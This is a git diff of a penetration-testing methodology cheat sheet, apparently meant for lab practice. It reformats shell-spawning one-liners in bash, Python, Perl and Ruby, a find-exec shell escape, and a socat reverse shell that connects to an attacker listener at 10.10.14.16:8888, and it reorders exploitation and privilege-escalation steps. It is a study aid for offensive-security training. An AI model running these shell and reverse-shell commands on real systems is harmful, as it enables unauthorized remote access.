@@ -160,9 +160,9 @@ mount -t cifs -o "//<[HOST IP]>/IPC" /mnt/cifs
 
 ## 5) EXPLOIT (USER 1)
 
-searchsploit / exploit-db
+credentials / misconfigurations
 
-metasploit
+searchsploit / exploit-db / metasploit
 
 custom exploitation
 
@@ -350,17 +350,19 @@ p.waitFor()
 ### SPAWN A SHELL
 
 #### BASH
-```/bin/sh -i
-(USING FIND) find /etc/passwd -exec /bin/bash ;
-```
+`/bin/sh -i`
+
+`(USING FIND) find /etc/passwd -exec /bin/bash ;`
+
 #### PYTHON
-```python -c 'import pty; pty.spawn("/bin/sh")'
-echo os.system('/bin/bash')
- ```
+`python -c 'import pty; pty.spawn("/bin/sh")'`
+
+`echo os.system('/bin/bash')`
+
 #### PERL
-```perl -e 'exec "/bin/sh";'
-perl: exec "/bin/sh";
- ```
+`perl -e 'exec "/bin/sh";'`
+`exec "/bin/sh";`
+
 #### RUBY
 `exec "/bin/sh"`
  
@@ -386,6 +388,7 @@ Enter while in reverse shell
 #### SOCAT
 ```
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method2usingsocat
+
 - 1 KALI: 
 socat file:'tty',raw,echo=0 tcp-listen:8888
 
@@ -395,8 +398,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:8888
 
 ## 7) POST EXPLOTATION / PRIVILEGE ESCALATION (USER 2)
 
-{SEARCHSPLOIT / EXPLOIT-DB}
-{METASPLOIT}
+credentials / misconfigurations
+
+searchsploit / exploit-db / metasploit
+
+custom exploitation
 
 [REPEAT 6+7 UNTIL...]
 
@@ -404,6 +410,3 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:8888
 
 
 ## N+1) REPORT
-
-
---------------------------------------------------------------
